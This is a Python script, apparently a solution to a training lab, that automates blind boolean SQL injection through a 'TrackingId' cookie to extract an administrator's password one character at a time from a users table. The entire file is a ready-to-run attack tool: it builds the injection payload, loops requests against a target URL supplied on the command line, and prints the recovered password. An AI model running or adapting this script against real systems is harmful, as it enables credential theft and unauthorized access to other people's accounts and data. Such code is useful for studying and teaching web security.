import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')={j}--"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                'TrackingId': f'z1wC2qDtMXgMVkER{sqli_payload_encoded}',
                'session': 'hSLl5o5GPjI2uFYfR6Z8dW0RM48nHgFT'
            }
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write(f'\r{password_extracted}{chr(j)}')
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write(f'\r{password_extracted}')
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
